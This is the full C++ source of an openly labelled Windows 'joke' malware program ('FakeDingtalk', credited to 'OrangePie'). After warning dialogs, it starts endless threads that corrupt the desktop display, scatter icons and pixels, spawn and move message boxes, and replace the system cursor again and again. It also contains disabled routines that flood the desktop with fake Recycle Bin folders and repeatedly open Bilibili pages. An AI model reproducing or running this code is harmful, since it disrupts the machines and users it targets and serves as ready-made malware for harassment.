#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
#include <winuser.h>
#include <wingdi.h>
#include <thread>
#include <chrono>
#include <random>
#include <fstream>
#include <ctime>
#include <unistd.h>



HINSTANCE hInstance = GetModuleHandle(NULL);
HDC hdc = GetDC(GetDesktopWindow());
int screen_width = GetSystemMetrics(SM_CXSCREEN);
int screen_height = GetSystemMetrics(SM_CYSCREEN);

// Random utility functions
int random(int min, int max) {
    return min + rand() % (max - min + 1);
}

// Function to perform a desktop resize and blit operation
void desktop_small() {
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    
    while (true){
        RECT rect;
        rect.left = random(0, GetSystemMetrics(SM_CXSCREEN));
        rect.top = random(0, GetSystemMetrics(SM_CYSCREEN));
        rect.right = random(0, GetSystemMetrics(SM_CXSCREEN));
        rect.bottom = random(0, GetSystemMetrics(SM_CYSCREEN));

        StretchBlt(hdc, 50, 50, rect.right - 100, rect.bottom - 100, hdc, 0, 0, rect.right, rect.bottom, SRCCOPY);

        ReleaseDC(hwnd, hdc);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

// Function to set the system cursor type randomly
void set_cursor_type() {
    while (true) {
        LPSTR cursorTypes[] = {IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_NO, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT};
        HCURSOR hCursor = LoadCursor(NULL, (LPCSTR)cursorTypes[random(0, 13)]);
        SetSystemCursor(hCursor, 1);
        Sleep(10);
    }
}

// Function to perform a desktop BitBlt operation
void desktop() {
    while (true){
        HWND hwnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hwnd);

        RECT rect;
        rect.left = random(0, GetSystemMetrics(SM_CXSCREEN));
        rect.top = random(0, GetSystemMetrics(SM_CYSCREEN));
        rect.right = random(0, GetSystemMetrics(SM_CXSCREEN));
        rect.bottom = random(0, GetSystemMetrics(SM_CYSCREEN));

        BitBlt(hdc, 0, 0, rect.right - rect.left, rect.bottom - rect.top, hdc, 0, 0, SRCCOPY);

        ReleaseDC(hwnd, hdc);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

// Function to draw icons at random positions on the desktop
void drawIco() {
    while (true){
        HWND hwnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hwnd);
        
        POINT p;
        GetCursorPos(&p);
        
        int iconw = GetSystemMetrics(SM_CXICON) / 2;
        int iconh = GetSystemMetrics(SM_CYICON) / 2;

        HICON hIcon1 = LoadIcon(NULL, (LPCSTR) IDI_APPLICATION);
        HICON hIcon2 = (HICON)LoadImage(NULL, "./di.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
        HICON hIcon3 = (HICON)LoadImage(NULL, "./di2.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
        HICON hIcon4 = (HICON)LoadImage(NULL, "./di3.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);

        DrawIcon(hdc, p.x - iconw, p.y - iconh, hIcon1);
        DrawIcon(hdc, p.x - iconw, p.y - iconh, hIcon2);
        DrawIcon(hdc, p.x - iconw, p.y - iconh, hIcon3);
        DrawIcon(hdc, p.x - iconw, p.y - iconh, hIcon4);

        HICON hIcon0 = LoadIcon(NULL, (LPCSTR) IDI_ERROR);
        int x = random(0, GetSystemMetrics(SM_CXSCREEN));
        int y = random(0, GetSystemMetrics(SM_CYSCREEN));

        DrawIcon(hdc, x, y, hIcon2);
        DrawIcon(hdc, x, y, hIcon1);
        DrawIcon(hdc, x, y, hIcon3);
        DrawIcon(hdc, x, y, hIcon4);
        DrawIcon(hdc, x, y, hIcon0);

        ReleaseDC(hwnd, hdc);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

// Function to perform a desktop copy operation with BitBlt
void desk_copy() {
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);

    while (true){
        RECT rect;
        rect.left = random(100, GetSystemMetrics(SM_CXSCREEN));
        rect.top = random(100, GetSystemMetrics(SM_CYSCREEN));
        rect.right = random(100, GetSystemMetrics(SM_CXSCREEN));
        rect.bottom = random(100, GetSystemMetrics(SM_CYSCREEN));

        int x = random(0, rect.right - 100);
        int y = random(0, rect.bottom - 100);
        int m = random(0, 600);
        int n = random(0, 600);
        int p = random(0, rect.right - 100);
        int q = random(0, rect.bottom - 100);

        BitBlt(hdc, x, y, m, n, hdc, p, q, SRCCOPY);

        ReleaseDC(hwnd, hdc);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

// Function to play a random sound
void sound() {
    UINT sounds[] = {MB_OK, MB_ICONHAND, MB_ICONQUESTION, MB_ICONEXCLAMATION};
    MessageBeep(sounds[random(0, 3)]);
}

// Function to move a window
void moveWindow(HWND hwnd, int x, int y, int width, int height) {
    MoveWindow(hwnd, x, y, width, height, TRUE);
}

// Function to get window size
std::pair<int, int> getWindowSize(HWND hwnd) {
    RECT rect;
    GetWindowRect(hwnd, &rect);
    return {rect.right - rect.left, rect.bottom - rect.top};
}

// Function to move a window without resizing
void moveWindowWithoutResize(HWND hwnd, int x, int y) {
    auto [width, height] = getWindowSize(hwnd);
    moveWindow(hwnd, x, y, width, height);
}

// Function to generate a random type
int randomtype() {
    return std::stoi("0x1" + std::to_string(random(0, 2)) + std::to_string(random(1, 4)) + std::to_string(random(0, 6)), nullptr, 16);
}

// Function to create a random message box and move it
void win() {
    while (true){
        std::string title = std::to_string(random(0, 114514));

        std::thread th([title]() {
            MessageBox(0, "Still using this computer?", title.c_str(), randomtype());
        });
        th.detach();
        Sleep(300);

        HWND hwnd = FindWindow(NULL, title.c_str());
        if (hwnd) {
            moveWindowWithoutResize(hwnd, random(0, GetSystemMetrics(SM_CXSCREEN) *1.5), random(0, GetSystemMetrics(SM_CYSCREEN)*1.5));
            SetWindowText(hwnd, "lol");
        }
    }
}

// Function to set a random window title
BOOL CALLBACK re(HWND hwnd, LPARAM lParam) {
    std::string random_title = "钉钉发来" + std::to_string(random(0, 114514)) + "条消息";
    SetWindowText(hwnd, random_title.c_str());
    return TRUE;
}

// Function to create random icons on the screen
void create_icons() {
    while (true) {
        for (int i = 0; i < 30; ++i) {
            int random_icons[] = {32512, 32513, 32514, 32515, 32516, 32517};
            HICON hicon = LoadIcon(NULL, MAKEINTRESOURCE(random_icons[random(0, 5)]));
            int x = random(0, GetSystemMetrics(SM_CXSCREEN) - 32);
            int y = random(0, GetSystemMetrics(SM_CYSCREEN) - 32);
            DrawIconEx(GetDC(0), x * 2, y * 2, hicon, 32, 32, 0, NULL, DI_NORMAL);
            Sleep(10);
        }
    }
}

bool is_windows_7_or_later() {
    OSVERSIONINFOEX osvi;
    DWORDLONG const dwlConditionMask = VerSetConditionMask(
        VerSetConditionMask(
            VerSetConditionMask(
                0, VER_MAJORVERSION, VER_GREATER_EQUAL),
                VER_MINORVERSION, VER_GREATER_EQUAL),
                VER_SERVICEPACKMAJOR, VER_GREATER_EQUAL);

    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    osvi.dwMajorVersion = 6;
    osvi.dwMinorVersion = 1;
    osvi.wServicePackMajor = 0;

    return VerifyVersionInfo(&osvi, VER_MAJORVERSION | VER_MINORVERSION | VER_SERVICEPACKMAJOR, dwlConditionMask);
}

bool is_admin() {
    BOOL is_admin = FALSE;
    PSID administrators_group;
    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(
        &nt_authority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &administrators_group)) {
        CheckTokenMembership(NULL, administrators_group, &is_admin);
        FreeSid(administrators_group);
    }

    return is_admin == TRUE;
}

bool prewarning() {
    if (is_windows_7_or_later()) {
        if (!is_admin()) {
            if (MessageBox(0, "This program recommends using admin to run.\nStill run it?", "FakeDingtalk", MB_ICONWARNING | MB_YESNO) == IDNO) {
                return false;
            }
        }
        if (MessageBox(0, "This program is not a JOKE! Still run it?\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE USING THIS MALWARE\nPlease use a safe environment to test!\n\n\n这个程序没有在开玩笑\n***还要运行吗???***\n创作者OrangePie不对任何使用该程序时造成的破坏负责\n请使用安全环境来测试程序\n", "FakeDingtalk", MB_ICONWARNING | MB_YESNO) == IDYES) {
            if (MessageBox(0, "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE USING THIS MALWARE!\nPlease click cancel to still run it.\n创作者OrangePie不对任何使用该程序时造成的破坏负责\n点击取消来运行", "FakeDingtalk", MB_ICONWARNING | MB_YESNO) == IDNO) {
                std::wcout << "Running Program!" << std::endl;
                return true;
            }
        }
    } else {
        MessageBox(0, "This program needs Windows 7 or later system!\n此应用需要Windows7或更新的系统", "Dingtalk", MB_ICONWARNING | MB_OK);
    }
    return false;
}

void RecycleBin() {
    wchar_t userprofile[MAX_PATH];
    GetEnvironmentVariableW(L"userprofile", userprofile, MAX_PATH);
    std::wstring desktopPath = std::wstring(userprofile) + L"\\Desktop";

    for (int i = 0; i < 64; ++i) {
        std::wstring newPath = desktopPath + L"\\回收站" + std::to_wstring(i + 1) + L".{645FF040-5081-101B-9F08-00AA002F954E}";
        CreateDirectoryW(newPath.c_str(), NULL);
        // if (i % 8 == 7) {
            // SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSH, NULL, NULL);
        // }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

void Circle() {
    int ix = GetSystemMetrics(SM_CXICON) / 2;
    int iy = GetSystemMetrics(SM_CYICON) / 2;
    int idx = 0;

    struct Point {
        LONG x;
        LONG y;
    } q;

    while (true) {
        idx++;
        if (idx > 9) idx = 0;

        HICON hIcon;
        switch (idx) {
        case 7:
            hIcon = (HICON)LoadImageW(NULL, L"./di.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
            break;
        case 8:
            hIcon = (HICON)LoadImageW(NULL, L"./di2.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
            break;
        case 9:
            hIcon = (HICON)LoadImageW(NULL, L"./di3.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
            break;
        default:
            hIcon = LoadIconW(0, (LPCWSTR) (32512 + idx));
            break;
        }

        Point p = q;
        for (int i = 0; i <= 100; i += 10) {
            GetCursorPos((LPPOINT)&p);
            int j = (int)sqrt(10000 - i * i);
            DrawIconEx(GetDC(0), (p.x + i - ix) * 2, (p.y + j - iy) * 2, hIcon, 0, 0, 0, NULL, DI_NORMAL);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        for (int i = 100; i >= 0; i -= 10) {
            GetCursorPos((LPPOINT)&p);
            int j = -(int)sqrt(10000 - i * i);
            DrawIconEx(GetDC(0), (p.x + i - ix) * 2, (p.y + j - iy) * 2, hIcon, 0, 0, 0, NULL, DI_NORMAL);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        for (int i = 0; i >= -100; i -= 10) {
            GetCursorPos((LPPOINT)&p);
            int j = -(int)sqrt(10000 - i * i);
            DrawIconEx(GetDC(0), (p.x + i - ix) * 2, (p.y + j - iy) * 2, hIcon, 0, 0, 0, NULL, DI_NORMAL);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        for (int i = -100; i <= 0; i += 10) {
            GetCursorPos((LPPOINT)&p);
            int j = (int)sqrt(10000 - i * i);
            DrawIconEx(GetDC(0), (p.x + i - ix) * 2, (p.y + j - iy) * 2, hIcon, 0, 0, 0, NULL, DI_NORMAL);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    }
}

void open_websites() {
    std::vector<std::wstring> websites = {
        L"https://search.bilibili.com/all?keyword=OrangePie",
        L"https://space.bilibili.com/114514",
        L"https://www.bilibili.com/video/BV114514",
        L"https://space.bilibili.com/102499223/",
        L"https://space.bilibili.com/401094700/fans/fans"
    };

    while (true) {
        for (const auto& website : websites) {
            ShellExecuteW(0, 0, website.c_str(), 0, 0, SW_SHOW);
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    }
}

void draw_rainbow() {
    std::vector<COLORREF> rainbow_colors = {
        RGB(255, 0, 0), RGB(255, 127, 0), RGB(255, 255, 0),
        RGB(0, 255, 0), RGB(0, 255, 255), RGB(0, 0, 255),
        RGB(75, 0, 130), RGB(148, 0, 211), RGB(255, 20, 147),
        RGB(255, 165, 0), RGB(255, 215, 0), RGB(124, 252, 0),
        RGB(0, 128, 0), RGB(0, 255, 127), RGB(0, 128, 128),
        RGB(0, 0, 128), RGB(128, 0, 128), RGB(128, 0, 0),
        RGB(255, 0, 255), RGB(128, 128, 0), RGB(0, 255, 0),
        RGB(0, 255, 255), RGB(255, 105, 180), RGB(255, 182, 193),
        RGB(255, 20, 147), RGB(255, 69, 0), RGB(255, 165, 0),
        RGB(255, 215, 0), RGB(255, 255, 0), RGB(173, 255, 47),
        RGB(0, 100, 0), RGB(124, 252, 0), RGB(0, 255, 127),
        RGB(0, 255, 255), RGB(64, 224, 208), RGB(0, 0, 255),
        RGB(138, 43, 226), RGB(75, 0, 130), RGB(238, 130, 238),
        RGB(255, 105, 180), RGB(255, 182, 193), RGB(255, 20, 147),
        RGB(255, 69, 0), RGB(255, 165, 0), RGB(255, 215, 0),
        RGB(255, 255, 0), RGB(173, 255, 47), RGB(0, 100, 0),
        RGB(124, 252, 0), RGB(0, 255, 127), RGB(0, 255, 255),
        RGB(64, 224, 208), RGB(0, 0, 255), RGB(138, 43, 226),
        RGB(75, 0, 130), RGB(238, 130, 238), RGB(255, 105, 180),
        RGB(255, 182, 193), RGB(255, 20, 147), RGB(255, 69, 0),
        RGB(255, 165, 0), RGB(255, 215, 0), RGB(255, 255, 0),
        RGB(173, 255, 47), RGB(0, 100, 0), RGB(124, 252, 0),
        RGB(0, 255, 127), RGB(0, 255, 255), RGB(64, 224, 208),
        RGB(0, 0, 255), RGB(138, 43, 226), RGB(75, 0, 130),
        RGB(238, 130, 238), RGB(255, 105, 180), RGB(255, 182, 193),
        RGB(255, 20, 147), RGB(255, 69, 0), RGB(255, 165, 0),
        RGB(255, 215, 0), RGB(255, 255, 0), RGB(173, 255, 47),
        RGB(0, 100, 0), RGB(124, 252, 0), RGB(0, 255, 127),
        RGB(0, 255, 255), RGB(64, 224, 208), RGB(0, 0, 255),
        RGB(138, 43, 226), RGB(75, 0, 130), RGB(238, 130, 238)
    };

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> disX(0, screen_width * 2);
    std::uniform_int_distribution<> disY(0, screen_height * 2);
    std::uniform_int_distribution<> disColor(0, rainbow_colors.size() - 1);

    while (true) {
        int x = disX(gen);
        int y = disY(gen);
        int colorIndex = disColor(gen);

        SetPixel(hdc, x, y, rainbow_colors[colorIndex]);

        std::this_thread::sleep_for(std::chrono::milliseconds(40));
    }
}



void insaneBox() {
    int x = GetSystemMetrics(SM_CXSCREEN) * 2;
    int y = GetSystemMetrics(SM_CYSCREEN) * 2;


    while (true) {
        int z = random(200, 1000);
        HDC hdc = GetDC(GetDesktopWindow());
        RECT rekt;
        GetClientRect(GetDesktopWindow(), &rekt);
        PatBlt(hdc, x, y, z, z, PATINVERT);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}


int main() {
    if (! prewarning()){
        exit(1);
    }
    // std::thread recycle_thread(RecycleBin);
    std::thread circle_thread(Circle);
    std::thread small_thread(desktop_small);
    std::thread copr_thread(desk_copy);
        // Create threads for various tasks
    // std::thread crun_thread(randomRun);
    std::thread sound_thread(sound);
    std::thread rainbow_thread(draw_rainbow);
    std::thread win_thread(win);
    std::thread ico_thread(drawIco);
    // Add more threads as needed for other tasks

    // Wait for all threads to finish
    // crun_thread.join();
    std::thread cursor(set_cursor_type);
    // std::thread websites_thread(open_websites); // chked
    std::thread insane_thread(insaneBox);


    cursor.detach();
    small_thread.join();
    copr_thread.join();
    ico_thread.join();
    // recycle_thread.join();
    circle_thread.join();

    win_thread.join();
    sound_thread.join();
    // websites_thread.join();
    rainbow_thread.join();
    insane_thread.join();

    return 0;
}
